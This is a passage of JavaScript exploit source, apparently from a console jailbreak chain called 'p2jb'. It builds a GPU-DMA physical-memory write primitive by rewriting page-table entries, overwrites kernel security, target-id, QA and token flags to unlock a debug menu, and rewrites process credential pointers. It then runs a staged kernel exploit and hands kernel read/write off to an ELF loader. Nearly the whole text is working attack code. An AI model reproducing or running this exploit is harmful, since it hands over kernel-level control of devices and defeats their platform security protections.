            write64_uncompressed(desc + 8n, qword1);
            return desc;
        };

        gpu.ioctl_submit_commands = function (pipe_id, cmd_count, cmd_descriptors_ptr) {
            const submit_struct = malloc(0x10);
            write32_uncompressed(submit_struct + 0x0n, BigInt(pipe_id));
            write32_uncompressed(submit_struct + 0x4n, BigInt(cmd_count));
            write64_uncompressed(submit_struct + 0x8n, cmd_descriptors_ptr);
            const ret = syscall(SYSCALL.ioctl, gpu.fd, 0xC0108102n, submit_struct);
            if (ret !== 0n) throw new Error("ioctl submit failed: " + toHex(ret));
        };

        gpu.setup = function () {
            gpu.fd = syscall(SYSCALL.open, alloc_string("/dev/gc"), O_RDWR);
            if (gpu.fd === 0xffffffffffffffffn) throw new Error("Failed to open /dev/gc");

            const prot_ro = PROT_READ | PROT_WRITE | GPU_READ;
            const prot_rw = prot_ro | GPU_WRITE;

            const victim_va = alloc_main_dmem(gpu.dmem_size, prot_rw, MAP_NO_COALESCE);
            const transfer_va = alloc_main_dmem(gpu.dmem_size, prot_rw, MAP_NO_COALESCE);
            const cmd_va = alloc_main_dmem(gpu.dmem_size, prot_rw, MAP_NO_COALESCE);

            const curproc_cr3 = get_proc_cr3(kernel.addr.curproc);
            kernel.addr.proc_cr3 = curproc_cr3;

            logger.log("gpu.setup: victim_va " + victim_va + " curproc_cr3 " + curproc_cr3);

            const victim_real_pa = virt_to_phys(victim_va, curproc_cr3);

            logger.log("gpu.setup: victim_real_pa " + victim_real_pa);

            const result = get_ptb_entry_of_relative_va(victim_va);
            if (!result) throw new Error("failed to setup gpu primitives");
            const [victim_ptbe_va, page_size] = result;
            if (!victim_ptbe_va || page_size !== gpu.dmem_size)
                throw new Error("failed to setup gpu primitives");

            if (syscall(SYSCALL.mprotect, victim_va, gpu.dmem_size, prot_ro) === 0xffffffffffffffffn)
                throw new Error("mprotect() error");

            const initial_victim_ptbe_for_ro = kernel.read_qword(victim_ptbe_va);
            const cleared_victim_ptbe_for_ro = initial_victim_ptbe_for_ro & (~victim_real_pa);

            gpu.victim_va = victim_va;
            gpu.transfer_va = transfer_va;
            gpu.cmd_va = cmd_va;
            gpu.victim_ptbe_va = victim_ptbe_va;
            gpu.cleared_victim_ptbe_for_ro = cleared_victim_ptbe_for_ro;
        };

        gpu.pm4_type3_header = function (opcode, count) {
            const packet_type = 3n;
            const shader_type = 1n;
            const predicate = 0n;
            const result = (
                (predicate & 0x0n) |
                ((shader_type & 0x1n) << 1n) |
                ((opcode & 0xffn) << 8n) |
                (((count - 1n) & 0x3fffn) << 16n) |
                ((packet_type & 0x3n) << 30n)
            );
            return result & 0xFFFFFFFFn;
        };

        gpu.pm4_dma_data = function (dest_va, src_va, length) {
            const count = 6n;
            const bufsize = Number(4n * (count + 1n));
            const opcode = 0x50n;
            const command_len = BigInt(length) & 0x1fffffn;
            const pm4 = malloc(bufsize);

            const dma_data_header = (
                (0n & 0x1n) |
                ((0n & 0x1n) << 12n) |
                ((2n & 0x3n) << 13n) |
                ((1n & 0x1n) << 15n) |
                ((0n & 0x3n) << 20n) |
                ((0n & 0x1n) << 24n) |
                ((2n & 0x3n) << 25n) |
                ((1n & 0x1n) << 27n) |
                ((0n & 0x3n) << 29n) |
                ((1n & 0x1n) << 31n)
            ) & 0xFFFFFFFFn;

            write32_uncompressed(pm4, gpu.pm4_type3_header(opcode, count));
            write32_uncompressed(pm4 + 0x4n, dma_data_header);
            write32_uncompressed(pm4 + 0x8n, src_va & 0xFFFFFFFFn);
            write32_uncompressed(pm4 + 0xcn, src_va >> 32n);
            write32_uncompressed(pm4 + 0x10n, dest_va & 0xFFFFFFFFn);
            write32_uncompressed(pm4 + 0x14n, dest_va >> 32n);
            write32_uncompressed(pm4 + 0x18n, command_len);
            return read_buffer(pm4, bufsize);
        };

        gpu.submit_dma_data_command = function (dest_va, src_va, size) {
            const dma_data = gpu.pm4_dma_data(dest_va, src_va, size);
            write_buffer(gpu.cmd_va, dma_data);
            const desc = gpu.build_command_descriptor(gpu.cmd_va, dma_data.length);
            gpu.ioctl_submit_commands(0, 1, desc);
            nanosleep_ms(500);
        };

        gpu.transfer_physical_buffer = function (phys_addr, size, is_write) {
            const trunc_phys_addr = phys_addr & ~(gpu.dmem_size - 1n);
            const offset = phys_addr - trunc_phys_addr;
            if (offset + BigInt(size) > gpu.dmem_size)
                throw new Error("transfer beyond direct memory size: " + size);

            const prot_ro = PROT_READ | PROT_WRITE | GPU_READ;
            const prot_rw = prot_ro | GPU_WRITE;

            if (syscall(SYSCALL.mprotect, gpu.victim_va, gpu.dmem_size, prot_ro) === 0xffffffffffffffffn)
                throw new Error("mprotect() error");

            const new_ptb = gpu.cleared_victim_ptbe_for_ro | trunc_phys_addr;
            kernel.write_qword(gpu.victim_ptbe_va, new_ptb);

            if (syscall(SYSCALL.mprotect, gpu.victim_va, gpu.dmem_size, prot_rw) === 0xffffffffffffffffn)
                throw new Error("mprotect() error");

            let src, dst;
            if (is_write) { src = gpu.transfer_va; dst = gpu.victim_va + offset; }
            else { src = gpu.victim_va + offset; dst = gpu.transfer_va; }

            gpu.submit_dma_data_command(dst, src, size);
        };

        gpu.write_buffer = function (addr, buf) {
            const phys_addr = virt_to_phys(addr, kernel.addr.kernel_cr3);
            if (!phys_addr) throw new Error("v2p failed for " + toHex(addr));
            write_buffer(gpu.transfer_va, buf);
            gpu.transfer_physical_buffer(phys_addr, buf.length, true);
        };

        gpu.write_byte = function (dest, value) {
            const buf = new Uint8Array(1);
            buf[0] = Number(value & 0xFFn);
            gpu.write_buffer(dest, buf);
        };
        gpu.write_dword = function (dest, value) {
            const buf = new Uint8Array(4);
            for (let i = 0; i < 4; i++) buf[i] = Number((value >> BigInt(i * 8)) & 0xFFn);
            gpu.write_buffer(dest, buf);
        };

        function alloc_main_dmem(size, prot, flag) {
            const out = malloc(8);
            const mem_type = 1n;
            const size_big = typeof size === "bigint" ? size : BigInt(size);
            const prot_big = typeof prot === "bigint" ? prot : BigInt(prot);
            const flag_big = typeof flag === "bigint" ? flag : BigInt(flag);
            const ret = call(sceKernelAllocateMainDirectMemory, size_big, size_big, mem_type, out);
            if (ret !== 0n)
                throw new Error("sceKernelAllocateMainDirectMemory() error: " + toHex(ret));
            const phys_addr = read64_uncompressed(out);
            write64_uncompressed(out, 0n);
            const name_buf = alloc_string("mem");
            //const ret2 = call(sceKernelMapNamedDirectMemory, out, size_big, prot_big, flag_big, phys_addr, size_big, name_buf);
            const ret2 = call(sceKernelMapDirectMemory, out, size_big, prot_big, flag_big, phys_addr, size_big);
            if (ret2 !== 0n) {
                throw new Error("sceKernelMapDirectMemory() error: " + hex(ret2));
            }
            return read64_uncompressed(out);
        }

        function get_curproc_vmid() {
            const vmspace = kernel.read_qword(kernel.addr.curproc + kernel_offset.PROC_VM_SPACE);
            const vmid = kernel.read_dword(vmspace + kernel_offset.VMSPACE_VM_VMID);
            return Number(vmid);
        }

        function get_gvmspace(vmid) {
            const vmid_big = typeof vmid === "bigint" ? vmid : BigInt(vmid);
            const gvmspace_base = kernel.addr.data_base + kernel_offset.DATA_BASE_GVMSPACE;
            return gvmspace_base + vmid_big * kernel_offset.SIZEOF_GVMSPACE;
        }

        function get_pdb2_addr(vmid) {
            return kernel.read_qword(get_gvmspace(vmid) + kernel_offset.GVMSPACE_PAGE_DIR_VA);
        }

        function get_relative_va(vmid, va) {
            if (typeof va !== "bigint") throw new Error("va must be BigInt");
            const gvmspace = get_gvmspace(vmid);
            const size = kernel.read_qword(gvmspace + kernel_offset.GVMSPACE_SIZE);
            const start_addr = kernel.read_qword(gvmspace + kernel_offset.GVMSPACE_START_VA);
            const end_addr = start_addr + size;
            if (va >= start_addr && va < end_addr) return va - start_addr;
            return null;
        }

        function get_ptb_entry_of_relative_va(virt_addr) {
            const vmid = get_curproc_vmid();
            const relative_va = get_relative_va(vmid, virt_addr);
            if (!relative_va)
                throw new Error("invalid virtual addr " + toHex(virt_addr) + " for vmid " + vmid);
            return gpu_walk_pt(vmid, relative_va);
        }


         function stage_debug_menu(S) {
            logger.log("stage_debug_menu: entered");

            if (!ENABLE_DEBUG_MENU) {
                logger.log("stage_debug_menu disabled");
                return;
            }

            const O = S.OFF;
            try {
                if (!O.DATA_BASE_SECURITY_FLAGS || !O.DATA_BASE_KERNEL_PMAP_STORE ||
                    !O.DATA_BASE_GVMSPACE) {
                    logger.log("stage_debug_menu: per-FW offsets missing for " + FW_VERSION +
                        " - skipping debug menu");
                    return;
                }
                if (!S.data_base || !S.curproc) {
                    logger.log("stage_debug_menu: data_base/curproc missing - skipped");
                    return;
                }

               kernel.read_buffer = (kaddr, size) => {
                    S.kread(S.scratch_big, BigInt(kaddr), Number(size));
                    return read_buffer(S.scratch_big, Number(size));
                };
                kernel.write_buffer = (kaddr, buf) => {
                    write_buffer(S.scratch_big, buf);
                    S.kwrite(BigInt(kaddr), S.scratch_big, buf.length);
                };
                kernel.addr.curproc = S.curproc;
                kernel.addr.data_base = S.data_base;

                const pmap_store = S.data_base + O.DATA_BASE_KERNEL_PMAP_STORE;
                const pml4 = S.kread64(pmap_store + O.PMAP_PML4);
                const cr3 = S.kread64(pmap_store + O.PMAP_CR3);
                const dmap_base = pml4 - cr3;
                logger.log("stage_debug_menu: pmap_store=" + toHex(pmap_store) +
                    " pml4=" + toHex(pml4) + " cr3=" + toHex(cr3) +
                    " dmap_base=" + toHex(dmap_base));

                const cr3_ok = cr3 !== 0n && (cr3 & 0xFFFn) === 0n && cr3 < 0x800000000n;
                const dmap_ok = (dmap_base >> 48n) === 0xFFFFn && (dmap_base & 0xFFFn) === 0n;
                if (!cr3_ok || !dmap_ok) {
                    logger.log("stage_debug_menu: pmap/dmap WRONG for FW " + FW_VERSION +
                        " (cr3_ok=" + cr3_ok + " dmap_ok=" + dmap_ok +
                        ") - DATA_BASE_KERNEL_PMAP_STORE likely incorrect; skipped");
                    return;
                }
                kernel.addr.kernel_cr3 = cr3;
                kernel.addr.dmap_base = dmap_base;

                update_kernel_offsets();
                logger.log("stage_debug_menu: `VMSPACE_VM_PMAP`=" +
                    toHex(kernel_offset.VMSPACE_VM_PMAP) + " VM_VMID=" +
                    toHex(kernel_offset.VMSPACE_VM_VMID) + " PROC_COMM=" +
                    toHex(kernel_offset.PROC_COMM));

                gpu.setup();
                logger.log("stage_debug_menu: gpu.setup() ok - GPU-DMA write primitive ready");

                const sf_addr = S.data_base + O.DATA_BASE_SECURITY_FLAGS;
                const tid_addr = S.data_base + O.DATA_BASE_TARGET_ID;
                const qa_addr = S.data_base + O.DATA_BASE_QA_FLAGS;
                const ut_addr = S.data_base + O.DATA_BASE_UTOKEN_FLAGS;

                const sf0 = kernel.read_dword(sf_addr);
                logger.log("stage_debug_menu: security_flags before=" + toHex(sf0));
                gpu.write_dword(sf_addr, sf0 | 0x14n);
                const sf = kernel.read_dword(sf_addr);
                logger.log("stage_debug_menu: security_flags after=" + toHex(sf));

                const tid0 = kernel.read_byte(tid_addr);
                logger.log("stage_debug_menu: target_id before=" + toHex(tid0));
                gpu.write_byte(tid_addr, 0x82n);
                const tid = kernel.read_byte(tid_addr);
                logger.log("stage_debug_menu: target_id after=" + toHex(tid));

                const qa0 = kernel.read_dword(qa_addr);
                logger.log("stage_debug_menu: qa_flags before=" + toHex(qa0));
                gpu.write_dword(qa_addr, qa0 | 0x10300n);
                const qa = kernel.read_dword(qa_addr);
                logger.log("stage_debug_menu: qa_flags after=" + toHex(qa));

                const ut0 = kernel.read_byte(ut_addr);
                logger.log("stage_debug_menu: utoken_flags before=" + toHex(ut0));
                gpu.write_byte(ut_addr, ut0 | 0x1n);
                const ut = kernel.read_byte(ut_addr);
                logger.log("stage_debug_menu: utoken_flags after=" + toHex(ut));

                const ok = ((sf & 0x14n) === 0x14n) && ((tid & 0xffn) === 0x82n) &&
                    ((qa & 0x10300n) === 0x10300n) && ((ut & 0x1n) === 0x1n);
                logger.log("stage_debug_menu: " +
                    (ok ? "=> DEBUG MENU ENABLED" : "=> verify FAILED"));
            } catch (e) {
                logger.log("stage_debug_menu: GPU debug-menu path failed: " + e.message +
                    " (jailbreak unaffected)");
            }
        }

        function force_td_ucred_migrate(S) {

            // post-jb KP fixes (ported from new p2jb)
            try {
                const B = S.proc_ucred;
                if (B === 0n || (B >> 48n) !== 0xFFFFn) {
                    logger.log("post-jb migrate: B invalid, skip");
                } else {

                    const nfiles = Number(S.kread32(S.fd_ofiles - S.OFF.FDESCENTTBL_HDR) & 0xFFFFFFFFn);
                    let fd_migrated = 0;
                    const migrated_creds = new Set();
                    if (nfiles > 0 && nfiles <= 0x10000) {
                        for (let i = 0; i < nfiles; i++) {
                            const fp = S.kread64(S.fd_ofiles + BigInt(i) * S.OFF.FILEDESCENT_SIZE);
                            if (fp === 0n || (fp >> 48n) !== 0xFFFFn) continue;
                            const fcred = S.kread64(fp + 0x10n);
                            if (fcred === B) continue;
                            if ((fcred >> 48n) !== 0xFFFFn) continue;
                            S.kwrite64(fp + 0x10n, B);
                            migrated_creds.add(toHex(fcred));
                            fd_migrated++;
                        }
                    }
                logger.log("post-jb migrate: " + fd_migrated + " fds f_cred -> B " +
                    "(" + migrated_creds.size + " distinct cred kptrs replaced)");

                    const TD_UCRED_OFF = 0x140n;
                    let td_migrated = 0;
                    const migrated_tcreds = new Set();
                    const main_thread = S.kread64(S.curproc + 0x10n);
                    if (main_thread !== 0n && (main_thread >> 48n) === 0xFFFFn) {
                        let td = main_thread, walked = 0;
                        while (td !== 0n && (td >> 48n) === 0xFFFFn && walked < 500) {
                            walked++;
                            if (S.kread64(td + 0x08n) !== S.curproc) {
                                logger.log("post-jb migrate: td_proc mismatch, abort thread walk");
                                break;
                            }
                            const tu = S.kread64(td + TD_UCRED_OFF);
                            if (tu !== B && (tu >> 48n) === 0xFFFFn) {
                                S.kwrite64(td + TD_UCRED_OFF, B);
                                migrated_tcreds.add(toHex(tu));
                                td_migrated++;
                            }
                            td = S.kread64(td + 0x10n);
                        }
                    }
                    logger.log("post-jb migrate: " + td_migrated + " threads td_ucred -> B (" +
                        migrated_tcreds.size + " distinct cred kptrs replaced)");

                    const total = fd_migrated + td_migrated;
                    if (total > 0) {
                        const rc_old = Number(S.kread32(B) & 0xFFFFFFFFn);
                        S.kwrite32(B, rc_old + total);
                    logger.log("post-jb migrate: cr_ref(B) " +
                        ("0x" + rc_old.toString(16)) + " -> " +
                        ("0x" + (rc_old + total).toString(16)) +
                        " (+" + total + ")");
                    } else {
                        logger.log("post-jb migrate: nothing to migrate (all already on B)");
                    }
                }
            } catch (e) {
                logger.log("post-jb migrate: failed: " + e.message +
                    " (jailbreak unaffected, close-KP may still fire)");
            }

            try {
                const A = S.ucred_A || 0n;
                const B = S.proc_ucred;
                if (A === 0n || (A >> 48n) !== 0xFFFFn) {
                    logger.log("post-jb pin: A invalid (" + toHex(A) + "), skip");
                } else if (B === 0n || (B >> 48n) !== 0xFFFFn) {
                    logger.log("post-jb pin: B invalid (" + toHex(B) + "), skip");
                } else if (A === B) {
                    logger.log("post-jb pin: A == B (unexpected), skip");
                } else {
                    const PIN_REFS = 0x10000000;
                    const buf = malloc(UCRED_SIZE);
                    S.kread(buf, B, UCRED_SIZE);
                    const old_A_ref = (S.kread32(A) & 0xFFFFFFFFn);
                    write32_uncompressed(buf, BigInt(PIN_REFS));
                    S.kwrite(A, buf, UCRED_SIZE);
                    const new_A_ref = (S.kread32(A) & 0xFFFFFFFFn);
                    if (Number(new_A_ref) === PIN_REFS) {
                        logger.log("post-jb pin: A=" + toHex(A) +
                        " overwritten with B-clone, cr_ref " +
                        toHex(old_A_ref) + " -> 0x" + PIN_REFS.toString(16) +
                            " (stale freelist consumers now see safe ucred)");
                    } else {
                        logger.log("post-jb pin: VERIFY FAILED, cr_ref(A)=" +
                        toHex(new_A_ref) + " (expected 0x" +
                        PIN_REFS.toString(16) + ")");
                    }
                }
            } catch (e) {
                logger.log("post-jb pin: failed: " + e.message +
                    " (jailbreak unaffected, close-KP may still fire)");
            }

            try {
                const buf_before = S.kread64(S.master_pipe_data + 0x10n);
                S.kwrite64(S.master_pipe_data + 0x10n, 0n);
            logger.log("post-jb: master.pipe_buffer.buffer NULL'd " +
                "(was " + toHex(buf_before) + " = victim_pipe_data, " +
                    "kernel free-path will now skip vm_map_remove)");
            } catch (e) {
                logger.log("post-jb: pipe_buffer restore failed: " + e.message +
                    " (jailbreak unaffected)");
            }
        }

        send_notification(p2jb_version);

        try {
            if (typeof is_jailbroken === "function" && is_jailbroken()) {
                send_notification("p2jb: already jailbroken");
                return;
            }

            // failcheck_path = "/" + get_nidpath() + "/common_temp/p2jb.fail";
            // logger.log("XXX failcheck path: " + failcheck_path);
            // if (file_exists(failcheck_path)) {
            //     logger.log("aborting, failcheck path exists: " + failcheck_path);
            //     // return;
            // }
            // logger.log("XXX about to write to: " + failcheck_path);
            // // nanosleep_ms(5000);
            // write_file(failcheck_path, "");
            // logger.log("XXX wrote to: " + failcheck_path);
        } catch (_) { failcheck_path = null; }

        logger.log(p2jb_version +" FW: " + FW_VERSION);

        ensure_kernel_offset();

        my_init_threading();

        const S = make_state();
        setup_cpu_masks(S);
        setup_worker_sockets(S);
        setup_iov_buffers(S);
        setup_uio_buffers(S);
        setup_pipes_kernrw(S);

        logger.log("pipes master=" + S.master_rfd + "," + S.master_wfd +
            " victim=" + S.victim_rfd + "," + S.victim_wfd);
        logger.log("spawning workers");
        setup_workers(S);
        setup_ipv6_spray(S);

        S.orig_main_core = get_current_core();
        logger.log("orig_main_core=" + S.orig_main_core);

        apply_main_thread_pinning(S);

        const leak_nw = LEAK_CORES.length;
        let eta_minutes;
        switch (leak_nw) {
            case 1: eta_minutes = 120; break;
            case 2: eta_minutes = 70; break;
            case 3: eta_minutes = 60; break;
            case 4: eta_minutes = 50; break;
            default: eta_minutes = Math.round(48 * 4 / leak_nw); break;
        }
        const eta_str =  eta_minutes + " min";
        logger.log("host OK - starting " + leak_nw + "-core leak, ETA to stage0 ~" + eta_str);

        prepare_fds(S);
        stage0(S);

        stage1(S);
        stage2(S);
        stage3(S);

        stage4(S);
        stage5(S);

        stage6(S);
        try { stage7(S); } catch (e) {
            logger.log("stage7: dynlib patch failed: " + e.message + " (jailbreak continues)");
            send_notification("Stage 7\ndynlib patch failed\n(jailbreak still complete)");
        }

        pin_to_core(S.orig_main_core);
        logger.log("restored main thread to core " + S.orig_main_core);

        force_td_ucred_migrate(S);

        {
            logger.log("p2jb handoff: ipv6_kernel_rw init for elf_loader");
            kernel.addr.data_base = S.data_base;
            ipv6_kernel_rw.init(S.fd_ofiles, S.kread64, S.kwrite64);
            logger.log("p2jb handoff: ipv6_kernel_rw built (master_sock=" +
                ipv6_kernel_rw.data.master_sock + " victim_sock=" +
                ipv6_kernel_rw.data.victim_sock + ")");

            const pin_sock = (fd) => {
                const fp = S.kread64(S.fd_ofiles + BigInt(fd) * S.OFF.FILEDESCENT_SIZE);
                if (fp === 0n || (fp >> 48n) !== 0xFFFFn) return;
                const so = S.kread64(fp);
                if (so === 0n || (so >> 48n) !== 0xFFFFn) return;
                S.kwrite32(so, 0x100);
            };
            pin_sock(ipv6_kernel_rw.data.master_sock);
            pin_sock(ipv6_kernel_rw.data.victim_sock);
            logger.log("p2jb handoff: handoff pipe + sockets pinned");
        }

        logger.log("=== p2jb complete ===");
    } catch (e) {
        try { logger.log("p2jb FATAL: " + e.message); } catch (_) { }
        try { send_notification("p2jb FAILED: " + e.message); } catch (_) { }
    }
})();
